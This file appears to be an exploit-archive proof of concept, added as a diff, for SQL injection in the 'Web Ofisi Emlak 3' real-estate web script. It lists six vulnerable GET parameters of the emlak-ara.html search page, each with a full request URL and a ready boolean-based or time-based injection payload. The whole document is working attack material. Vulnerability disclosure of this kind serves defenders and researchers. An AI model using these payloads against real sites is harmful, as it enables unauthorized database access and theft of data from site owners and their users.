@@ -1,0 +1,50 @@
+# Exploit Title: Web Ofisi Emlak 3 - 'emlak_durumu' SQL Injection
+# Date: 2019-07-19
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor: https://www.web-ofisi.com/detay/emlak-scripti-v3.html
+# Demo Site: http://demobul.net/emlakv3/
+# Version: V2
+# Tested on: Kali Linux
+# CVE: N/A
+
+----- PoC 1: SQLi -----
+
+Request:
+http://localhost/[PATH]/emlak-ara.html?emlak_durumu=0&emlak_tipi=0&il=0&ilce=0&kelime=0&max_fiyat=e&max_metrekare=e&min_fiyat=e&min_metrekare=e&resim=evet&semt=0&video=evet
+Vulnerable Parameter: emlak_durumu (GET)
+Payload: -1' OR 3*2*1=6 AND 000744=000744 --
+
+----- PoC 2: SQLi -----
+
+Request:
+http://localhost/[PATH]/emlak-ara.html?emlak_durumu=0&emlak_tipi=0&il=0&ilce=0&kelime=0&max_fiyat=e&max_metrekare=e&min_fiyat=e&min_metrekare=e&resim=evet&semt=0&video=evet
+Vulnerable Parameter: emlak_tipi (GET)
+Payload: 0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z
+
+----- PoC 3: SQLi -----
+
+Request:
+http://localhost/[PATH]/emlak-ara.html?emlak_durumu=0&emlak_tipi=0&il=0&ilce=0&kelime=0&max_fiyat=e&max_metrekare=e&min_fiyat=e&min_metrekare=e&resim=evet&semt=0&video=evet
+Vulnerable Parameter: il (GET)
+Payload: 0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z
+
+----- PoC 4: SQLi -----
+
+Request:
+http://localhost/[PATH]/emlak-ara.html?emlak_durumu=0&emlak_tipi=0&il=0&ilce=0&kelime=0&max_fiyat=e&max_metrekare=e&min_fiyat=e&min_metrekare=e&resim=evet&semt=0&video=evet
+Vulnerable Parameter: ilce (GET)
+Payload: -1' OR 3*2*1=6 AND 000397=000397 --
+
+----- PoC 5: SQLi -----
+
+Request:
+http://localhost/[PATH]/emlak-ara.html?emlak_durumu=0&emlak_tipi=0&il=0&ilce=0&kelime=0&max_fiyat=e&max_metrekare=e&min_fiyat=e&min_metrekare=e&resim=evet&semt=0&video=evet
+Vulnerable Parameter: kelime (GET)
+Payload: -1' OR 3*2*1=6 AND 000397=000397 --
+
+----- PoC 6: SQLi -----
+
+Request:
+http://localhost/[PATH]/emlak-ara.html?emlak_durumu=0&emlak_tipi=0&il=0&ilce=0&kelime=0&max_fiyat=e&max_metrekare=e&min_fiyat=e&min_metrekare=e&resim=evet&semt=0&video=evet
+Vulnerable Parameter: semt (GET)
+Payload: -1' OR 3*2*1=6 AND 000531=000531 --
